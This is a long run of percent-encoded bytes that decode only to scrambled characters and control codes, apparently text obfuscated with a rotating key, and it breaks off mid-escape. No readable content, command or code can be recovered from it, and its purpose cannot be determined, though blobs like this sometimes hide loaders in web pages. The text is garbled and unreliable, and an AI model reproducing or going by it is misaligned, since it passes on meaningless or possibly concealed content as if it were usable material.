b%6a%64%63%75%3f%20%74%72%62%63%6c%70%7b%3e%23%30%29%34%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%2e%60%70%7a%76%73%75%2f%74%60%72%73%69%65%69%65%3b%68%73%6c%2f%61%6b%6b%6b%66%28%74%66%65%2d%27%79%20%66%60%65%6a%6b%72%74%75%6f%62%3d%24%72%67%67%6b%64%6e%2f%6c%70%62%62%6c%63%6e%70%2b%65%6c%70%65%69%65%21%65%73%24%35%34%24%20%32%32%27%29%22%77%65%75%2c%2f%2b%66%72%7c%72%74%74%2d%63%6d%73%61%71%6f%6d%2b%2b%22%74%77%61%6f%73%77%67%72%63%6d%74%2c%3f%20%67%73%79%29%72%6c%63%60%72%79%3d%22%30%25%32%21%35%37%74%78%24%75%63%75%2a%2f%2a%67%73%7d%77%70%71%2b%61%6b%73%67%71%6e%6c%2a%2a%27%6f%6e%71%64%74%27%32%20%35%22%36%76%7f%24%72%6d%61%63%2f%30%34%3c%2e%32%32%3e%28%32%32%2f%30%29%35%2b%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%67%73%7d%77%70%71%2b%73%63%75%76%6b%60%6e%66%3c%69%70%68%2b%66%68%6c%6e%64%2d%37%6f%2d%27%79%20%66%60%65%6a%6b%72%74%75%6f%62%3d%24%72%67%67%6b%64%6e%2f%6c%70%62%62%6c%63%6e%70%2b%65%6c%70%65%69%65%21%65%73%24%35%34%24%20%32%32%27%29%22%77%65%75%2c%2f%2b%66%72%7c%72%74%74%2d%66%72%6f%63%72%63%74%6f%2c%2e%20%71%70%62%68%72%74%63%76%64%6e%73%29%3d%25%60%70%7e%28%71%68%67%67%71%7e%38%20%35%22%31%26%34%34%70%7c%23%76%64%70%28%2a%2d%64%74%7c%74%74%75%2c%67%73%6a%67%77%65%76%69%2c%28%20%6f%6d%75%60%76%20%35%22%31%26%30%74%78%24%71%69%65%61%28%3e%3a%2d%35%35%32%2c%36%36%34%2b%32%2e%32%29%3c%26%78%0b%0a%24%23%20%27%22%20%25%22%2f%63%75%7f%70%70%72%2f%77%61%72%71%69%64%6a%60%3e%6e%70%6b%2f%62%6a%6b%69%66%29%32%69%2f%20%79%23%62%64%67%6d%6c%70%70%71%69%60%3a%24%71%63%63%69%63%69%2d%68%74%64%60%6b%63%6d%74%2f%67%6b%77%67%6d%61%27%67%74%24%36%30%20%22%35%35%25%2d%26%71%67%72%2c%2c%2f%62%70%7b%75%76%70%29%72%6f%6c%72%64%72%2c%2e%20%71%70%62%68%72%74%63%76%64%6e%73%29%3d%25%60%70%7e%28%71%68%67%67%71%7e%38%20%35%22%31%26%34%34%70%7c%23%76%64%70%28%2a%2d%64%74%7c%74%74%75%2c%75%6c%6e%76%62%70%2a%2a%27%6f%6e%71%64%74%27%32%20%35%22%36%76%7f%24%72%6d%61%63%2f%31%3b%37%2e%32%3d%35%28%33%3f%31%2c%37%2c%37%2e%3f%21%79%08%0e%20%24%23%20%27%22%20%25%2c%64%74%7c%74%74%75%2c%70%64%70%74%6e%67%6d%61%3d%6a%74%6c%2c%65%6f%69%6c%61%2a%36%68%2c%24%7d%24%61%63%62%6f%69%77%73%76%68%63%3e%20%76%60%64%6c%61%6c%2a%6b%73%65%63%6f%67%6a%77%28%62%69%72%60%6e%66%26%64%70%20%31%33%27%27%37%30%22%2e%21%70%64%76%28%2b%2c%65%75%79%70%71%73%2e%64%75%75%6e%7e%64%2b%2b%22%74%77%61%6f%73%77%67%72%63%6d%74%2c%3f%20%67%73%79%29%72%6c%63%60%72%79%3d%22%30%25%32%21%35%37%74%78%24%75%63%75%2a%2f%2a%67%73%7d%77%70%71%2b%61%72%76%6c%7a%62%29%2d%26%6c%6a%75%63%77%20%37%22%30%25%35%71%7e%27%76%69%66%60%28%35%32%37%29%31%33%3f%2b%33%30%28%33%2e%30%29%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%40%68%65%7a%60%75%67%6f%63%76%20%61%6e%71%66%76%21%7b%27%34%27%24%7e%20%73%70%63%6b%77%67%77%75%6b%3a%24%77%72%64%6c%75%69%61%75%61%5c%2c%33%34%33%76%6f%29%20%77%73%75%65%73%63%28%34%67%67%6e%29%3d%25%7d%21%35%37%34%27%24%7e%20%73%70%63%6b%77%67%77%75%6b%3a%24%77%72%64%6c%75%69%61%75%61%5c%2c%2f%37%33%30%71%6a%2b%25%70%70%72%64%70%67%2c%36%36%37%66%67%6c%29%3c%26%78%24%7f%0b%09%20%27%22%20%25%22%21%26%29%66%6c%73%71%2f%60%64%66%62%67%75%26%7a%24%70%75%76%6b%73%69%71%6b%38%21%60%6c%7c%67%60%3e%20%7e%69%64%71%6a%3b%26%35%34%30%23%3e%20%6f%65%6b%6c%6a%75%3c%27%36%30%34%24%3d%27%76%71%75%38%21%29%30%34%27%39%23%6c%60%64%74%3f%22%2e%31%37%23%3d%24%61%63%62%6f%69%77%73%76%68%63%3e%20%76%60%64%6c%61%6c%2a%6b%73%65%63%6f%67%6a%77%28%62%69%72%60%6e%66%26%64%70%20%36%33%27%27%35%30%22%2e%21%74%6e%66%63%2c%34%3b%2b%31%35%35%2e%33%32%31%28%30%2a%30%2b%27%32%27%29%22%75%74%64%6a%75%74%60%72%60%6c%74%25%35%31%21%2c%28%20%76%60%64%6c%61%6c%2a%6b%73%65%63%6f%67%6a%77%28%62%69%72%60%6e%66%26%64%70%20%3c%33%27%27%30%30%22%2e%21%74%6e%66%63%2c%30%35%3c%2e%3b%37%2e%33%32%31%28%30%2a%30%2b%27%32%27%29%22%75%74%64%6a%75%74%60%72%60%6c%74%25%35%31%21%2c%28%20%76%60%64%6c%61%6c%2a%6b%73%65%63%6f%67%6a%77%28%62%69%72%60%6e%66%26%64%70%20%30%33%27%27%3a%30%22%2e%21%74%6e%66%63%2c%31%34%3e%2e%33%31%3b%2d%34%31%28%30%2a%30%2b%27%32%27%29%22%75%74%64%6a%75%74%60%72%60%6c%74%25%35%31%21%2c%39%20%67%6d%6b%68%61%74%6e%73%6f%3c%27%66%6c%73%71%4f%76%74%67%25%34%31%73%27%6f%6e%62%68%6e%6c%76%67%25%61%6d%72%60%76%6e%67%77%67%27%65%63%70%65%2e%6d%69%2b%71%73%77%3d%27%64%6b%69%76%66%74%3d%24%62%68%74%72%2f%36%30%75%7a%2a%3b%27%7e%2f%6f%6d%64%60%7a%3a%25%2d%33%3b%27%7b%0f%0e%23%20%27%22%20%25%22%21%46%6a%63%7b%62%71%63%68%65%75%25%60%6d%71%75%4b%71%72%64%20%7a%22%30%22%22%7c%26%73%76%63%6a%76%66%76%70%6f%3f%22%75%74%64%6a%75%68%60%74%60%2a%30%22%2e%31%21%2c%24%72%75%77%63%73%65%28%35%66%66%6f%2c%39%20%7b%23%35%32%25%20%78%22%75%74%64%6a%75%62%72%72%68%38%20%71%70%62%68%72%68%63%70%64%28%28%35%27%29%35%26%2d%27%76%71%70%60%74%60%2a%33%37%32%65%61%6e%2f%3d%24%7c%20%31%34%27%25%7f%21%72%75%67%6e%71%65%71%75%6d%3a%25%76%73%65%69%71%6c%67%77%67%2f%35%27%29%2d%36%21%2c%24%72%75%77%63%73%65%28%37%36%31%62%60%6d%2b%39%23%7f%27%31%30%35%25%21%7b%27%70%72%67%6d%75%61%73%72%6a%38%21%72%75%67%6e%71%6f%63%73%65%28%35%25%2d%36%20%2f%20%76%72%74%64%76%67%2d%37%37%36%63%63%69%2f%3e%20%78%22%7f%0a%08%0e%0c%27%24%20%24%23%20%27%22%31%2f%22%6d%77%6e%6f%6e%24%29%31%08%08%20%25%22%21%26%27%24%20%2a%6f%71%6e%69%6e%2a%67%70%68%73%67%6b%6a%64%72%27%7f%20%61%69%74%76%6b%67%7b%3e%23%66%6b%65%78%38%22%6b%71%72%70%6b%62%78%2f%62%73%6e%71%65%6f%72%3d%24%65%63%6d%74%60%70%3d%25%61%6d%6d%6e%6a%2f%6f%77%67%68%77%3a%25%67%66%68%73%63%72%39%23%6f%6c%6c%2f%6d%65%6a%6f%6f%70%3a%24%30%30%37%74%68%38%22%71%65%63%60%6b%6a%6a%3a%27%31%36%75%7a%3c%26%77%75%75%6f%77%6b%76%6c%3a%25%70%66%6a%64%70%6b%72%64%3d%27%78%2f%6e%6c%65%61%7f%3e%20%37%3e%20%7e%69%64%71%6a%3b%26%34%34%30%23%3e%20%78%0d%0a%25%22%21%26%27%24%20%24%2d%6c%76%6b%6b%6b%2d%63%77%7f%24%7d%24%61%63%62%6f%69%77%73%76%68%63%3e%20%76%6a%62%64%2a%35%35%2e%35%35%2b%33%3b%28%33%2e%3f%35%2b%38%22%63%65%62%69%64%76%72%70%28%64%6b%69%76%66%74%3d%24%62%68%74%72%2f%31%32%75%7a%2a%3b%27%66%71%76%67%67%75%2d%72%66%66%6a%71%72%3e%20%36%33%70%7f%3f%20%75%61%65%62%6c%6a%69%3e%23%35%35%72%78%25%30%35%76%7f%39%20%7d%68%64%73%6a%3a%25%31%31%36%20%39%20%6b%60%78%28%7b%6b%61%76%69%3c%27%30%30%34%73%78%3a%22%62%74%70%65%61%75%3e%20%37%73%78%27%77%71%69%69%65%26%75%6d%62%67%2b%32%30%35%2c%37%35%36%2a%35%33%37%28%33%2e%34%29%3d%25%60%70%7e%28%71%68%67%67%71%7e%38%20%35%22%32%36%77%7c%20%30%33%70%7f%22%72%6c%60%62%2e%37%28%30%28%33%2c%37%2c%34%2e%2e%21%36%27%34%20%34%23%33%77%7a%20%77%6b%63%65%2f%36%37%33%2f%32%30%35%2c%37%35%36%2a%37%2a%30%33%28%2c%27%69%6e%70%65%75%26%37%24%33%74%7b%20%37%22%72%6c%60%62%2e%35%33%37%28%31%37%30%2e%32%32%35%2d%36%29%37%2b%39%23%63%69%69%6f%66%76%6a%77%69%3e%20%68%72%69%6c%6c%55%69%69%65%61%50%74%20%34%2d%36%72%22%67%66%77%66%29%76%73%74%39%23%70%76%77%6b%71%69%70%68%3d%24%72%63%6f%63%73%69%76%62%3f%21%77%71%63%72%62%6f%71%7e%38%20%6d%69%65%62%60%6a%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%2e%68%72%69%6c%6c%2f%67%73%79%3c%3d%66%67%62%72%72%60%22%7d%25%67%70%68%73%63%6e%70%39%20%2e%2b%3d%25%72%70%73%6c%70%6b%75%6d%3a%27%61%62%70%73%6d%71%73%63%3d%24%77%71%77%38%20%35%3f%21%6a%60%62%74%3e%23%30%3a%22%72%6e%6b%69%72%3d%24%30%39%23%68%60%69%69%6d%76%3b%26%33%74%78%39%23%62%64%67%6d%6c%70%70%71%69%60%3a%24%6f%6b%69%65%63%77%2d%68%74%64%60%6b%63%6d%74%2f%39%30%61%65%68%2a%27%72%63%76%2b%2f%28%67%72%7e%72%75%77%28%66%6b%70%66%71%6c%6c%2b%29%22%77%65%75%2c%2f%2b%66%72%7c%72%74%74%2d%66%72%6f%63%72%63%74%6f%2c%2e%20%73%61%73%2e%28%2b%65%76%78%70%73%73%2f%6c%73%6d%62%2c%2f%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%2e%68%72%69%6c%6c%2f%6d%65%62%62%60%76%20%79%23%74%60%7a%74%2a%61%6d%6d%6e%6a%3a%24%66%67%69%76%67%77%3f%21%69%64%76%69%6f%6d%2f%65%73%74%71%73%6e%3c%27%31%32%74%7b%3d%27%7d%0f%0f%22%21%26%27%24%20%24%23%2e%6b%73%69%6e%6c%2e%6a%76%6d%71%24%7e%20%61%73%6e%71%2d%74%6d%7d%63%3a%24%31%2e%3f%70%67%6a%3f%21%69%64%76%69%6f%6d%2f%65%73%74%71%73%6e%3c%27%37%36%74%7b%3d%27%66%6b%70%72%6d%65%7c%3e%20%6f%6d%6c%6c%6c%67%2a%60%6d%77%62%69%3d%24%61%63%62%6f%69%77%73%76%68%63%3e%20%68%68%6e%60%61%72%2a%6b%73%65%63%6f%67%6a%77%28%34%37%37%61%65%68%2a%27%72%63%76%2b%2f%28%67%72%7e%72%75%77%28%6d%71%68%67%2b%2b%22%76%66%70%29%29%28%61%72%7f%73%74%76%2d%62%6e%76%64%77%6c%6a%2b%2f%3e%20%28%7b%67%67%6f%6a%72%28%66%63%61%6e%69%75%73%77%6b%66%2e%63%6b%6f%70%3e%23%74%60%7a%74%38%22%2e%7f%60%66%6d%6f%77%2f%73%65%78%71%2d%67%6d%6b%68%2f%61%72%6c%76%70%3a%25%76%73%65%69%71%70%67%71%67%69%76%3d%25%64%6a%6a%73%63%72%3e%23%64%75%73%70%2a%77%69%65%63%75%79%2c%33%20%37%22%38%75%7a%21%74%6e%66%63%2c%31%37%30%2e%32%36%35%2d%36%2b%34%2e%31%28%2b%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%6e%71%6c%69%6f%29%73%6f%74%68%64%20%7a%22%66%74%6c%75%29%72%6f%7a%63%39%20%34%2c%39%32%70%66%69%3a%24%66%75%6d%74%28%7b%67%6e%6b%69%72%3d%24%39%34%33%3d%27%6d%63%77%6b%6a%68%28%66%71%70%77%71%68%38%20%3d%72%79%3b%27%66%63%61%6e%69%75%73%77%6b%66%3b%26%6b%6f%6e%63%60%72%28%6b%72%66%66%6a%61%69%70%28%37%36%37%63%65%69%29%22%24%60%34%62%37%62%38%2c%27%27%65%67%66%36%61%34%2f%3d%24%2c%79%60%60%6d%6e%76%2e%64%64%61%6d%6d%71%71%70%6c%64%2a%67%6d%6d%77%3e%20%70%64%78%73%3f%20%2a%7b%66%64%6a%6f%74%2b%77%67%7f%76%2f%63%69%6d%6a%28%61%71%68%72%72%3d%22%74%77%61%6f%73%77%67%72%63%6d%74%3a%22%6c%6e%6c%66%29%6f%63%6b%6d%6b%74%3d%22%33%2b%37%3c%26%78%0b%0a%24%23%20%27%22%20%25%22%2f%6a%76%6d%6b%6a%2c%75%70%60%74%6e%76%6d%61%27%79%20%61%72%6c%76%70%3a%25%74%62%74%2f%2b%2f%70%64%78%73%2d%75%62%67%70%68%63%67%72%7f%28%3d%27%64%71%6b%76%2e%73%6c%7e%67%3e%23%30%29%39%72%62%6d%3c%26%68%67%72%6d%68%6e%28%60%71%71%76%70%69%3d%24%32%30%73%78%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%6e%71%6c%69%6f%29%61%75%72%6b%23%7d%27%66%6b%70%72%6d%65%7c%3e%20%62%6f%67%7f%3f%20%63%6e%66%7e%28%60%6b%76%64%65%73%69%71%6b%38%21%63%76%68%77%6b%6d%3d%27%6b%63%75%38%21%34%37%74%78%39%23%7f%08%08%20%25%22%21%26%27%24%20%2a%65%71%75%6d%2f%6c%70%70%71%77%24%7d%24%73%71%72%69%74%6e%73%6f%3c%27%76%67%68%60%74%6c%74%67%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%64%70%74%68%2b%6c%67%61%67%6b%22%7d%25%66%6a%73%77%68%63%7f%39%20%65%6e%71%60%6f%3c%26%68%67%72%6d%68%6e%28%60%71%71%76%70%69%3d%24%36%74%7b%3d%27%67%71%69%73%73%3c%27%72%63%76%2b%2f%28%76%67%7d%76%2e%76%75%6f%6f%67%71%7b%2c%3f%20%63%73%6f%72%28%7d%67%6f%6a%68%73%38%20%33%32%31%3b%27%62%71%6a%77%2f%72%69%7a%62%38%21%36%29%3f%72%63%6c%3d%27%66%6b%70%72%6d%65%7c%3e%20%62%6f%67%7f%3f%20%66%6e%6a%6f%69%2b%6b%70%64%6f%72%38%20%60%65%6f%72%60%76%3d%24%6a%63%77%38%20%33%72%79%3b%27%7b%0f%0e%23%20%27%22%20%25%22%21%28%61%75%72%6b%2c%6b%69%72%77%71%22%7c%26%7e%6f%64%70%6b%3a%27%31%30%35%25%3c%26%77%67%64%60%68%6e%6e%38%20%36%36%71%7e%3a%24%62%67%66%6d%6e%70%71%72%6c%65%3c%27%76%69%66%60%28%34%35%2c%37%37%2d%32%35%28%30%2a%3a%2b%3a%22%62%74%70%65%61%75%3e%20%37%73%78%27%77%71%69%69%65%26%75%6d%62%67%2b%32%30%35%2c%37%35%36%2a%35%33%37%28%33%2e%34%29%3d%25%60%70%74%63%63%72%2b%71%63%63%69%77%70%38%21%35%37%74%78%39%23%65%76%6e%71%77%38%21%70%64%76%28%2b%2c%74%60%7a%74%2a%72%73%6d%68%67%72%7f%28%3d%27%64%71%6b%76%2e%73%6c%7e%67%3e%23%33%75%65%6f%38%22%75%74%64%6a%75%6f%77%6b%76%6c%3a%25%61%6d%6a%27%34%2e%31%76%20%60%61%75%62%3f%21%77%70%70%6c%6f%6d%67%3d%22%6e%74%6c%66%3b%27%2b%79%63%61%6d%6c%76%2f%66%72%71%61%64%76%63%6a%66%67%3d%22%6e%74%6c%66%3b%27%7b%0f%0e%23%20%27%22%20%25%22%21%28%61%75%72%6b%2c%6b%69%72%77%71%38%67%77%62%73%75%24%7e%20%65%73%72%61%65%73%29%62%75%6c%75%71%3a%27%74%63%77%2a%2e%29%62%76%7b%74%77%71%28%6b%71%69%66%2a%3b%27%66%71%7c%2c%75%6f%61%64%74%7b%3b%26%37%24%30%24%33%20%32%72%78%25%70%68%64%64%2c%32%33%34%2c%35%31%37%29%32%2d%36%29%37%37%2f%3e%20%65%61%65%68%6b%73%77%70%6a%64%3e%23%72%6e%60%63%2d%31%36%2a%35%31%2c%30%31%2c%37%2c%3b%2e%3f%21%79%08%0e%20%24%23%20%27%22%20%25%2c%71%65%72%71%79%75%71%64%28%76%71%6c%6b%6d%61%27%79%20%74%72%75%6c%76%6b%74%6c%3b%26%64%66%75%75%6f%77%73%65%3d%25%70%6a%6f%6f%70%3a%24%30%32%77%7a%3d%25%76%70%76%3d%24%34%34%73%78%3a%22%62%66%67%6c%6f%75%75%77%6a%67%3a%27%6c%71%6b%65%3c%26%65%75%72%60%64%72%3d%22%6e%74%6c%66%3b%27%61%71%68%72%72%3d%22%76%66%70%29%29%28%70%67%7c%77%2f%72%65%65%74%6c%65%65%75%7f%2b%39%23%65%70%70%75%74%70%3b%26%77%75%6b%6a%77%67%75%3f%20%63%73%6f%72%28%71%6b%7e%64%3a%27%31%72%62%6d%3c%26%73%76%63%6a%76%6b%73%69%71%6b%38%21%63%76%68%71%76%23%30%29%37%75%25%65%62%73%60%39%20%74%60%64%63%69%6e%6c%38%21%3e%77%7c%3d%24%67%6b%72%72%6c%66%79%3b%26%61%68%67%7c%3e%20%64%6e%6b%6c%6c%2e%6d%73%63%6f%71%39%20%62%65%6e%71%65%73%3b%27%6e%77%71%77%6b%61%79%2f%60%73%6f%72%60%6a%74%3e%23%65%60%6c%74%62%70%3c%26%7e%6f%64%70%6b%3a%27%36%30%75%7a%3c%26%6f%63%6b%6d%6b%74%3d%22%34%35%72%79%3b%27%66%71%76%67%67%75%2d%72%66%66%6a%71%72%3e%20%33%33%27%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%72%63%70%77%78%77%75%60%2f%70%72%69%6e%6e%67%3f%6a%70%70%60%76%20%79%23%65%76%6e%71%77%38%21%70%64%76%28%2b%2c%65%75%79%70%71%73%2e%6f%76%68%64%2f%3e%20%65%61%65%68%6b%73%77%70%6a%64%3e%23%72%6e%60%63%2d%30%36%31%2b%36%37%33%2f%32%30%35%2c%35%2c%31%31%2c%39%20%7b%0c%0a%27%22%20%25%22%21%26%27%2a%6c%75%6a%6b%69%2d%62%71%6c%21%7b%27%7d%6b%60%77%68%3d%22%33%35%32%26%3b%27%74%63%60%67%6b%69%6b%3a%25%31%37%76%7f%39%20%66%60%65%6a%6b%72%74%75%6f%62%3d%24%6c%6f%6d%67%64%70%2f%6c%70%62%62%6c%63%6e%70%2b%33%32%35%64%62%6b%2d%26%71%67%72%2c%2c%2f%62%70%7b%75%76%70%29%65%6f%74%61%72%6b%69%29%2c%25%74%62%74%2f%2b%2f%61%71%7b%77%76%71%2a%6b%70%6a%63%2f%2b%39%23%62%76%70%64%62%70%3b%26%69%75%6e%63%3e%20%65%73%72%61%65%73%29%75%67%64%6f%74%75%3d%22%33%35%72%79%3b%27%61%71%68%72%72%3d%22%79%6d%69%75%61%3a%24%66%75%6d%74%28%7b%67%6e%6b%69%72%3d%24%39%34%33%3d%27%64%71%6b%76%2e%73%6c%7e%67%3e%23%33%75%65%6f%38%22%64%71%75%71%71%76%39%20%77%73%6b%6b%76%66%74%3a%24%74%76%60%6e%72%69%74%6e%73%6f%3c%27%67%6c%68%23%30%29%37%75%25%65%62%73%60%39%20%60%68%75%77%6e%63%7e%38%21%60%6b%63%78%39%23%63%6b%69%69%6b%2d%6a%72%60%6b%75%3e%23%65%60%6c%74%62%70%3c%26%6d%73%75%70%68%66%7c%2d%65%74%6c%75%61%69%70%3a%24%66%67%69%76%67%77%3f%21%6f%64%74%3a%24%3b%70%7f%3f%20%6a%61%73%6f%6c%6a%2f%70%72%70%3d%22%38%75%7a%3c%26%65%75%78%2b%76%68%64%66%71%7c%38%21%36%27%30%70%7c%23%33%35%72%78%25%70%68%64%64%2c%32%30%3a%2c%34%36%39%29%30%37%2a%37%2a%35%2f%3e%20%68%69%6e%2a%6a%66%6d%6e%6c%74%3e%23%37%35%72%78%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%6e%70%6f%6c%6a%2f%66%77%6e%3d%6a%71%73%65%73%26%7a%24%74%76%60%6e%72%64%71%77%6d%3b%26%73%76%63%6a%76%6c%64%76%67%5e%2a%2e%34%77%7c%2b%39%23%62%76%7a%2f%70%6a%62%62%76%7d%3a%24%33%20%31%72%78%25%31%37%76%7f%24%72%6d%61%63%2f%30%34%3c%2e%32%32%3e%28%32%32%2f%30%29%36%2b%38%22%63%65%62%69%69%76%72%77%69%66%3a%25%6e%6a%68%60%67%72%2b%6a%72%64%66%6b%62%6c%75%2e%34%31%37%60%64%69%2b%22%76%66%70%29%29%28%61%72%7f%73%74%76%2d%69%74%6e%65%2d%2b%24%76%67%71%28%28%2d%65%77%79%71%72%76%2b%62%6f%77%65%76%69%6e%2e%29%3c%26%78%0b%0a%24%23%20%27%22%20%25%22%2f%6a%76%6d%6b%6a%2c%66%76%73%74%62%70%21%7b%27%70%67%7c%77%2f%64%6e%6b%6c%6c%3b%26%62%63%6e%70%64%72%3a%22%6f%66%70%68%6d%69%2b%74%75%73%3a%27%30%34%75%7a%3c%26%77%67%64%60%68%6e%6e%2d%74%74%72%3b%26%34%32%70%7c%3e%20%65%73%72%61%65%73%29%73%75%70%3e%23%33%77%7a%20%70%73%6d%6d%63%24%72%6d%61%63%2f%30%37%32%2e%33%31%30%28%32%33%34%2c%37%2c%33%2e%3f%21%63%76%68%71%76%39%20%71%61%72%2d%2d%2e%72%60%7c%74%2b%76%67%62%73%6e%61%61%73%7d%2c%39%20%62%72%6e%73%2d%75%6e%78%66%3c%27%34%2e%3c%34%72%60%6d%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%2e%69%73%68%6d%69%2b%67%76%71%71%75%22%7d%25%60%62%63%6a%6d%72%75%74%6e%63%38%20%77%6b%63%65%2f%36%35%3f%2f%36%3f%2e%36%3d%2e%31%28%35%2f%3d%24%61%71%75%66%67%77%38%21%35%77%7c%20%71%72%6c%6c%66%20%73%61%73%2e%28%2b%64%67%6d%69%60%70%2b%38%22%64%77%6b%75%72%3e%23%76%64%70%28%2a%2d%65%65%69%6d%67%76%28%3d%27%72%63%61%66%6a%68%6e%3e%20%37%31%70%7f%3f%20%67%73%73%62%60%76%2f%76%60%64%6c%75%75%3f%22%39%76%7f%39%20%6b%60%72%6e%69%6e%2a%76%70%76%3d%24%33%32%73%78%3a%22%74%62%7a%75%29%64%68%6b%6d%6d%3a%27%67%67%6b%76%66%74%3a%24%66%75%6d%74%28%77%6b%7f%65%3b%26%37%2a%38%33%71%67%68%3f%20%66%6c%6a%69%64%70%6b%75%6d%3a%27%64%63%61%65%4a%68%27%34%2e%31%76%20%60%61%75%62%3f%21%62%6c%71%70%68%60%7b%3d%22%66%69%65%79%3b%27%67%6c%6f%6a%6e%28%69%74%62%6d%74%3c%27%61%67%6a%77%67%75%3f%20%6f%75%74%72%6c%62%7b%2b%66%71%69%76%67%6b%76%3b%26%62%63%6e%70%64%72%3a%22%69%66%72%3b%26%31%74%78%39%23%7f%08%08%0f%0f%22%21%26%27%24%20%24%23%31%2d%22%6f%66%69%6f%26%64%74%70%24%29%31%08%08%20%25%22%21%26%27%24%20%2a%6c%63%6c%6c%2f%66%72%71%26%7a%24%64%6f%76%70%6b%61%7b%3f%22%6f%77%69%63%3d%24%6c%6b%69%2d%68%62%69%68%6e%73%3e%20%37%33%30%71%6a%3d%25%72%70%73%6c%70%6b%75%6d%3a%27%70%67%69%61%75%6d%71%63%3d%24%7a%6b%63%76%68%3f%22%32%36%37%23%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%2e%6b%60%6b%69%2d%63%75%72%2f%65%62%70%6b%72%64%20%7a%22%64%6e%77%71%6a%64%7f%3a%24%61%6c%76%67%6d%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%67%70%68%73%67%6b%6a%64%72%27%7f%20%7c%69%65%72%6f%3e%20%37%33%30%20%3f%20%6a%61%79%29%7e%6f%64%70%6b%3a%27%31%32%35%32%71%7e%3a%24%6f%67%71%69%6c%6c%3a%25%32%21%65%70%70%71%39%23%70%64%66%64%6e%6c%68%3c%27%37%36%74%7b%3d%27%7d%0f%0f%22%21%26%27%24%20%24%23%68%60%61%64%62%70%21%7b%27%70%67%7c%77%2f%64%6e%6b%6c%6c%3b%26%62%63%6e%70%64%72%3a%22%6f%66%70%68%6d%69%2b%62%75%77%74%76%6d%3a%25%30%35%76%7f%39%20%74%60%64%63%69%6e%6c%38%21%35%31%74%78%24%33%3d%27%7d%0f%0f%22%21%26%27%24%20%24%23%68%60%61%64%62%70%21%6e%34%24%7d%24%65%71%69%76%2f%70%69%7b%61%3d%24%33%2a%3a%37%75%65%6f%38%22%67%77%69%70%2f%7d%64%6b%6e%6a%74%3f%22%38%36%37%39%20%6b%60%72%6e%69%6e%2a%60%70%72%73%75%6f%3e%23%38%77%7a%3d%25%60%62%63%6a%6d%72%75%74%6e%63%38%20%69%69%6f%61%64%76%2f%6d%71%63%63%69%67%6b%76%29%3d%37%60%67%6d%2f%20%71%61%72%2d%2d%2e%65%62%61%67%6a%77%2b%2b%22%25%3d%60%36%63%61%32%2b%39%23%2f%7e%65%62%68%69%75%29%65%67%65%69%6a%72%76%75%6e%61%2d%64%6a%6c%74%3a%24%77%67%7f%76%3d%25%2d%78%61%65%69%6b%70%2c%74%60%7a%74%2a%64%6a%6a%6b%2b%65%75%6f%71%75%38%20%71%70%62%68%72%74%63%76%64%6e%73%3f%20%61%69%74%76%6b%67%7b%3e%23%6b%69%6e%6b%6b%65%2e%64%6b%75%65%69%3e%20%77%73%75%6e%76%6a%77%69%3e%20%76%64%6c%64%76%6b%73%65%3c%26%6b%6f%6e%63%2c%68%60%69%69%6d%76%3b%26%34%2a%35%39%23%70%64%66%64%6e%6c%68%3c%27%34%20%3c%73%78%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%6f%65%63%61%65%73%26%6f%37%3a%3e%60%66%73%65%72%25%7f%21%63%76%6a%74%63%6d%74%3d%22%29%2c%3f%21%76%76%71%6b%70%68%71%69%38%20%66%60%74%77%6b%73%74%63%3e%20%65%73%74%71%73%6e%3c%27%2b%36%74%7b%3d%27%6e%67%63%76%3b%26%30%34%27%39%23%74%75%61%6e%70%64%70%74%68%3e%20%70%71%63%69%77%6c%66%76%66%5e%2f%2b%37%34%24%2b%3a%22%79%6e%66%75%6e%3d%24%38%34%73%78%3a%22%68%62%69%68%6e%73%3e%20%31%73%78%3a%22%62%66%67%6c%6f%75%75%77%6a%67%3a%27%6e%6b%6b%65%62%74%28%6d%72%67%67%6b%60%6c%74%2d%39%31%62%60%6d%2c%24%75%63%75%2a%2f%2a%61%64%63%60%6a%74%2f%2f%20%22%3a%62%32%67%67%30%2c%39%20%66%72%72%63%65%72%2a%70%62%62%6c%73%75%3e%23%32%77%7a%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%2e%70%76%62%72%72%2b%65%75%6d%74%64%69%6e%62%70%21%7b%27%60%6b%71%73%6c%64%79%3a%25%6b%73%6d%63%39%20%6d%71%6b%63%2d%74%62%6d%71%6a%64%70%67%2b%66%71%6b%75%6f%6b%77%3b%26%34%62%72%39%23%69%64%72%3a%25%31%37%76%7f%39%20%6b%60%72%6e%69%6e%2a%60%70%72%73%75%6f%3e%23%32%33%72%78%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%77%75%65%73%2b%65%67%71%64%27%7f%20%67%61%64%6b%6e%76%71%73%6d%64%3d%22%76%66%70%29%29%28%66%69%2b%66%63%75%66%2b%38%22%63%65%62%69%64%76%72%70%28%64%6b%69%76%66%74%3d%24%62%68%74%72%2f%31%30%75%7a%2a%3b%27%66%71%76%67%67%75%2d%72%66%66%6a%71%72%3e%20%37%37%70%7f%3f%20%75%61%65%62%6c%6a%69%3e%23%32%37%72%78%25%31%37%76%7f%39%20%66%72%72%63%65%72%3f%22%32%76%7f%24%75%75%6f%6b%63%22%76%66%70%29%29%28%6d%6c%67%76%75%2c%3f%20%71%70%62%68%72%6f%74%6f%72%6e%3d%22%63%69%6e%21%36%29%31%75%24%64%63%72%65%3d%25%76%66%7e%73%2b%63%68%68%69%69%38%20%60%65%6f%72%60%76%3d%24%73%71%72%69%74%6e%73%6f%3c%27%76%67%68%60%74%6c%74%67%38%22%70%70%60%76%66%68%72%79%3d%22%68%6e%66%65%61%69%39%20%7b%0c%0a%27%22%20%25%22%21%26%27%2a%75%70%60%74%28%67%63%77%66%3b%3c%65%63%66%75%71%67%27%7f%20%60%73%6f%72%60%6a%74%3e%23%29%2e%3f%20%75%73%74%6d%73%6f%71%6a%39%20%64%60%75%74%6e%76%72%60%39%20%70%72%70%3d%22%30%